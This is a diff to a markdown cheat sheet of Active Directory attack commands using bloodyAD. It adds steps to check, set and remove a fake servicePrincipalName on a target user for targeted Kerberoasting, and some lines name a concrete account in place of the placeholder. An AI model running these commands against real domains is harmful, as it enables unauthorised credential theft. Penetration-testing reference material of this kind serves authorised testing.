@@ -106,10 +106,14 @@ bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_FQDN> --dc-ip <DC_IP> 
 With `WriteSPN` permission. Kerberoast after writing the SPN.
 
 ```bash
+# Check for SPN
+bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> get object divanov --attr servicePrincipalName
+
+# Set SPN
 bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object <TARGET_USER> servicePrincipalName -v 'fake/<TARGET_USER>'
 
-# Cleanup after roasting
-bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> remove object <TARGET_USER> servicePrincipalName -v 'fake/<TARGET_USER>'
+# Remove SPN
+bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP> set object divanov servicePrincipalName
 ```
 
 ### `WriteOwner`: Take Ownership + Grant Rights
